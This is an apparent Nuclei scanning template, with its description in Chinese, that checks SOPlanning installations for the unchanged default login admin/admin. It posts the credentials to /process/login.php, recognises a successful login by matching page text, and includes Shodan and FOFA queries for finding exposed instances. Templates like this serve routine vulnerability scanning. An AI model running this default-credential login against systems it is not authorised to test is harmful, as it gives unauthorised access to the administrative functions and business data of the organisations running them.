id: soplanning-default-login

info:
  name: SOPlanning 默认口令登录（弱口令）
  author: s4e-io
  severity: high
  description: |
    该模板通过尝试 SOPlanning 的默认凭据，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统并访问相应管理功能或业务数据。
  reference:
    - https://www.soplanning.org/en/
  metadata:
    verified: true
    max-request: 1
    vendor: soplanning
    product: soplanning
    shodan-query:
      - html:"soplanning"
      - http.html:"soplanning"
    fofa-query: body="soplanning"
  tags: soplanning,default-login,vuln

http:
  - raw:
      - |
        POST /process/login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        login={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    host-redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:
      - type: word
        words:
          - 'title="Logout"'
          - 'title="Modify my profile"'
          - "Settings"
        condition: and

      - type: status
        status:
          - 200
